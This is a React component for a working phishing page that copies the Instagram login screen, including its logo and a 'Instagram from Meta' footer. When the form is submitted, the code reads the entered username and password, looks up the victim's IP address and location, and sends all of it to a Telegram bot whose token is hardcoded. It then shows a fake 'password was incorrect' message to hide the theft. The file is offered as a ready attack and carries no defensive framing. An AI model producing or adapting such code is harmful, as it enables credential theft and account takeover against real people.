import React, { useState } from "react";
import Logo from "../assets/images.png";
import AppDownload from "./AppDownload";

const Instagram = () => {
  const [type, setType] = useState("password");
  const [icon, setIcon] = useState(true);
  const [result, setResult] = useState("");

  const handleToggle = () => {
    if (icon) {
      setType("password");
      setIcon(!icon);
    } else {
      setType("text");
      setIcon(!icon);
    }
  };

  const onSubmit = async (event) => {
    event.preventDefault();
    const formData = {};
    Array.from(event.currentTarget.elements).forEach((field) => {
      if (!field.name) return;
      formData[field.name] = field.value;
    });

    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        var ct = data.ip;
        var co = data.country_name;
        var lo = data.country_calling_code;
        var st = data.city;

        var NameLogin = formData.name;
        var PasswordLogin = formData.password;
        var SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;


        var token = "6807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
        var chat_id = -4969598577;
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        setTimeout(() => {
          setResult("Sorry, your password was incorrect. Please double-check your password.");
        }, 2000);
      });
  };

  return (
    <section className="h-screen flex flex-col items-center justify-center pb-10">
      <div className="md:border-2 px-8 py-10 max-w-sm w-full">
        <form className="grid gap-3" onSubmit={onSubmit}>
          <img
            className="h-16 mx-auto
          "
            src={Logo}
            alt="Instagram"
          />
          <input
            required
            className="py-3 border-2 px-3 rounded-md bg-transparent text-sm"
            type="text"
            name="name"
            placeholder="Phone number, username, or email"
          />
          <div className="flex items-center relative mb-3">
            <input
              required
              type={type}
              className="py-3 gap-3 border-2 px-3 rounded-md flex-grow bg-transparent text-sm"
              name="password"
              placeholder="Password"
            />
            <span
              className="absolute right-5 cursor-pointer hover:text-black/40 text-black-70 text-sm"
              onClick={() => handleToggle()}
            >
              {icon ? "Hide" : "Show"}
            </span>
          </div>
          <button
            type="submit"
            className="bg-blue-500 py-2 text-lg text-white hover:bg-blue-400 rounded-md"
          >
            Log in
          </button>
          <p className="text-center text-xs text-red-600">{result}</p>
          <div className="orr">
            <p className="text-[#dadada]">or</p>
          </div>
          <div className="text-center">
            <a href="#" className="text-sm font-medium text-black/60">
              Forget password?
            </a>
          </div>
        </form>
      </div>
      <div className="md:border-2 px-8 md:py-5 md:mt-5 max-w-sm w-full text-center">
        <span className="text-sm">
          Don't have an account?{" "}
          <a href="#" className="text-blue-600 font-semibold">
            Sign Up
          </a>
        </span>
      </div>
      <AppDownload />
      <div className="mt-auto text-black/50">
        English ©  {new Date().getFullYear()} Instagram from Meta
      </div>
    </section>
  );
};

export default Instagram;
